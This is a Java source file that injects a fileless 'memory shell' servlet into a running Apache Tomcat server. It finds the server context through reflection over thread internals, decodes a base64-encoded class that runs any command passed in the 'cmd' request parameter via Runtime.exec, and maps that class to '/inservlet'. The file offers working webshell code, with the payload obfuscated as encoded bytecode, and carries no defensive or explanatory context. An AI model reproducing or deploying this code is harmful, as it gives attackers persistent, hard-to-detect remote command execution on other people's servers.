package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class InjectServletByServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Object StandardContext= null;
        String servletname="MyServlet";
        String urlPattern = "/inservlet";
        try{
            StandardContext = getContext();
            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            String ServletBase64="yv66vgAAADMAhgoAGgBOCABPCwBQAFEKABkAUgsAUwBUCgBVAFYHAFcKAFgAWQoAWABaCgBbAFwHAF0KAAsAXgcAXwoADQBgBwBhCgAPAE4KAA0AYgcAYwoAEgBOCgASAGQIAGUKABIAZgoADwBnCgAPAGYHAGgHAGkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC0xNeVNlcnZsZXQ7AQAFZG9HZXQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAEdmFyNwEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAaAcAagcAawcAbAcAVwEACkV4Y2VwdGlvbnMHAG0HAG4BAAtDb21tYW5kRXhlYwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQACcnQBABNMamF2YS9sYW5nL1J1bnRpbWU7AQAEcHJvYwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAZzdGRlcnIBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwcAbwcAcAcAcQcAXQcAXwcAYQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAOTXlTZXJ2bGV0LmphdmEMABsAHAEAB3NlcnZsZXQHAGoMAHIANwwANgA3BwBrDABzAHQHAHUMAHYAdwEAE2phdmEvbGFuZy9FeGNlcHRpb24HAG8MAHgAeQwAegB7BwBwDAB8AH0BABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAbAH4BABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAbAH8BABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDACAAIEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAggCDAQABCgwAhACBDACCAIUBAAlNeVNlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvU3RyaW5nAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAMZ2V0UGFyYW1ldGVyAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwAhABkAGgAAAAAABAABABsAHAABAB0AAAAvAAEAAQAAAAUqtwABsQAAAAIAHgAAAAYAAQAAAAoAHwAAAAwAAQAAAAUAIAAhAAAABAAiACMAAgAdAAAAuAACAAUAAAAhKxICuQADAgBOKi22AAQ6BCy5AAUBABkEtgAGpwAFOgSxAAEACQAbAB4ABwADAB4AAAAaAAYAAAANAAkAEAAQABEAGwATAB4AEgAgABUAHwAAAD4ABgAQAAsAJAAlAAQAIAAAACYAJwAEAAAAIQAgACEAAAAAACEAKAApAAEAAAAhACoAKwACAAkAGAAsACUAAwAtAAAAGQAC/wAeAAQHAC4HAC8HADAHADEAAQcAMgEAMwAAAAYAAgA0ADUAAQA2ADcAAgAdAAABKQADAAkAAABguAAITSwrtgAJTi22AAo6BLsAC1kZBLcADDoFuwANWRkFtwAOOgYBOge7AA9ZtwAQOggZBrYAEVk6B8YAIBkIuwASWbcAExkHtgAUEhW2ABS2ABa2ABdXp//bGQi2ABiwAAAAAwAeAAAAKgAKAAAAGAAEABkACgAaABAAGwAbABwAJgAdACkAHgAyACAAPQAhAFoAJAAfAAAAXAAJAAAAYAAgACEAAAAAAGAALAAlAAEABABcADgAOQACAAoAVgA6ADsAAwAQAFAAPAA9AAQAGwBFAD4APwAFACYAOgBAAEEABgApADcAQgAlAAcAMgAuAEMARAAIAC0AAAAlAAL/ADIACQcALgcAMQcARQcARgcARwcASAcASQcAMQcASgAAJwAzAAAABAABAAcAAQBLABwAAQAdAAAAKwAAAAEAAAABsQAAAAIAHgAAAAYAAQAAACgAHwAAAAwAAQAAAAEAIAAhAAAAAQBMAAAAAgBN";
            byte[] ServletClass = new BASE64Decoder().decodeBuffer(ServletBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class servletClass = (Class) defineClass1.invoke(classLoader, ServletClass, 0, ServletClass.length);
            Servlet servletObject=(Servlet)servletClass.newInstance();

            Method m0=StandardContext.getClass().getSuperclass().getSuperclass().getDeclaredMethod("createWrapper");
            m0.setAccessible(true);
            Object StandardWrapper=m0.invoke(StandardContext);

            Method m11=StandardWrapper.getClass().getSuperclass().getDeclaredMethod("setName",String.class);
            m11.setAccessible(true);
            m11.invoke(StandardWrapper,servletname);

            Method m1=StandardWrapper.getClass().getDeclaredMethod("setServletName",String.class);
            m1.setAccessible(true);
            m1.invoke(StandardWrapper,servletname);

            Method m3=StandardWrapper.getClass().getDeclaredMethod("setServlet", Servlet.class);
            m3.setAccessible(true);
            m3.invoke(StandardWrapper,servletObject);

            Class<?> ContainerClass=classLoader.loadClass("org.apache.catalina.Container");
            Method m5=StandardContext.getClass().getSuperclass().getSuperclass().getDeclaredMethod("addChild",ContainerClass);
            m5.setAccessible(true);
            m5.invoke(StandardContext,StandardWrapper);

            Method m4=StandardContext.getClass().getSuperclass().getSuperclass().getDeclaredMethod("addServletMapping",String.class,String.class);
            m4.setAccessible(true);
            m4.invoke(StandardContext,urlPattern,servletname);

            Method m9=StandardContext.getClass().getSuperclass().getSuperclass().getDeclaredMethod("registerJMX");
            m9.setAccessible(true);
            m9.invoke(StandardContext);

        } catch (Exception e){e.printStackTrace();}
    }

    public Object getContext() throws NoSuchFieldException, IllegalAccessException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field f1=threadGroup.getClass().getDeclaredField("threads");
        f1.setAccessible(true);
        Thread[] threads=(Thread[])f1.get(threadGroup);

        for(Thread thread:threads) {
            try {
                Field fname = thread.getClass().getDeclaredField("name");
                fname.setAccessible(true);
                String  chars = (String) fname.get(thread);

                if (chars.contains("ContainerBackgroundProcessor") && chars.matches(".*StandardContext\\[/.+\\]")){
                    Field f2 = thread.getClass().getDeclaredField("target");
                    f2.setAccessible(true);
                    Object target = f2.get(thread);
                    Field f3 = target.getClass().getDeclaredField("this$0");
                    f3.setAccessible(true);
                    Object this0 = f3.get(target);
                    return this0;
                }
            }catch (Exception e){
                System.out.println(e);
            }
        }
        return null;
    }

}
